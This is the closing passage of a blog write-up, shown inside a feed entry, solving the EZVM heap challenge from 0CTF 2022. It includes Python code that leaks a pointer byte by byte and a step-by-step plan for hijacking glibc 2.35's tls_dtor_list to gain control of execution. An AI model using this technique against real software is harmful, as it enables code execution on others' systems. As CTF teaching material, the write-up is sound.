<span class="n">leaked_bytes</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">num_bytes</span><span class="p">):</span>
<span class="n">prog</span> <span class="o">=</span> <span class="n">leak_byte</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">byte_idx</span><span class="o">=</span><span class="n">x</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">output</span> <span class="o">=</span> <span class="nf">run_vm</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">mem_size</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">10</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
<span class="n">leaked_byte</span> <span class="o">=</span> <span class="n">output</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">).</span><span class="nf">count</span><span class="p">(</span><span class="sh">"</span><span class="s">what???</span><span class="sh">"</span><span class="p">)</span>
<span class="n">leaked_bytes</span> <span class="o">=</span> <span class="p">[</span><span class="n">leaked_byte</span><span class="p">]</span> <span class="o">+</span> <span class="n">leaked_bytes</span>

    <span class="n">leaked_addr</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">leaked_bytes</span><span class="p">:</span>
        <span class="n">leaked_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">leaked_addr</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">x</span>

    <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Leaked value : </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">leaked_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">leaked_addr</span></code></pre></figure> <h2 id="step-7-the-target">Step 7: The Target</h2> <p>In the version of libc that the challenge uses (libc-2.35), the usual suspects for PC control such as <code class="language-plaintext highlighter-rouge">__free_hook</code> and <code class="language-plaintext highlighter-rouge">__malloc_hook</code> have been removed.</p> <p>But then there’s some code that always gets invoked when the program exits. Namely the <code class="language-plaintext highlighter-rouge">__run_exit_handlers()</code></p> <p>This function calls <code class="language-plaintext highlighter-rouge">__call_tls_dtors()</code> which walks a linked list called <code class="language-plaintext highlighter-rouge">tls_dtor_list</code> and executes the functions specified by each object’s function pointer.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/tls-480.webp 480w,/assets/img/ezvm/tls-800.webp 800w,/assets/img/ezvm/tls-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/tls.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Since we have an arbitrary overwrite, we can overwrite one entry in the linked list to point to an area we control. And with that, we can force the <code class="language-plaintext highlighter-rouge">__call_tls_dtors()</code> function to call a function pointer that we control.</p> <p>So then my plan for exploit was as follows</p> <ul> <li>Heap fengshui to get a heap pointer in the memory buffer</li> <li>Leak pointer to get heap leak</li> <li>Heap fengshui to get a libc pointer in the memory buffer</li> <li>Leak pointer to get libc leak</li> <li>Create fake <code>tls_dtor_list</code> object on heap</li> <li>Overwrite <code>tls_dtor_list</code> with the fake object</li> <li>????</li> <li>Profit</li> </ul> <p>We do have to take care of a pesky <code class="language-plaintext highlighter-rouge">PTR_DEMANGLE</code> macro which is basically a right shift followed by an xor. However, an easy way to fix it is to overwrite the xor key with 0.</p> <p>And putting it all together:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/pwned-480.webp 480w,/assets/img/ezvm/pwned-800.webp 800w,/assets/img/ezvm/pwned-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/pwned.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The final exploit is available here: <a href="/assets/python/ezvm/exploit.py">Exploit</a></p> <p>And the assembler is available here: <a href="/assets/python/ezvm/assembler.py">Assembler</a></p>]]></content><author><name></name></author><category term="writeup"/><category term="heap"/><category term="ctf"/><summary type="html"><![CDATA[Solving the EZVM challenge from 0CTF 2022]]></summary></entry></feed>